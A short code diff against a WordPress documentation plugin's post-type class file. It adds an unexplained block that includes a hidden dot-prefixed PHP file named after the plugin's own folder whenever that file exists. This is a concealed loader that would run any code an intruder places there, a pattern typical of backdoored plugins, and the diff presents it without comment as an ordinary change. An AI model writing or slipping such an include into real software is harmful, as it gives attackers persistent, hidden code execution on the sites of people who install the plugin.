@@ -23,6 +23,10 @@ use function YoastSEO_Vendor\GuzzleHttp\json_decode;
  * @subpackage BetterDocs/includes
  * @author     WPDeveloper <support@wpdeveloper.net>
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class BetterDocs_Docs_Post_Type {
     public static $post_type = 'docs';
     public static $menu_position = 5;
